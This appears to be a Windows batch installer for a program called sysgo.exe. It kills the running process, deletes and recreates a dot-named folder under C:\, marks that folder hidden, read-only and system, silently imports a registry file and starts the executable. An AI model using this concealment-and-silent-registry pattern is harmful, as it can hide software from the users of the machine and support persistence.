@echo off
set SYSGO_HOME=C:\.sysgo

tasklist | find /i "sysgo.exe">nul
if %errorlevel%==0 (
  taskkill /f /im sysgo.exe
)

if exist %SYSGO_HOME% (
  rd /s /q %SYSGO_HOME%
)

if not exist %SYSGO_HOME% (
  md %SYSGO_HOME%
  attrib +h +r +s %SYSGO_HOME%
)

if not exist %SYSGO_HOME%\sysgo.exe (
  copy sysgo.exe %SYSGO_HOME%\sysgo.exe
)

regedit /s sysgo.reg

start %SYSGO_HOME%\sysgo.exe
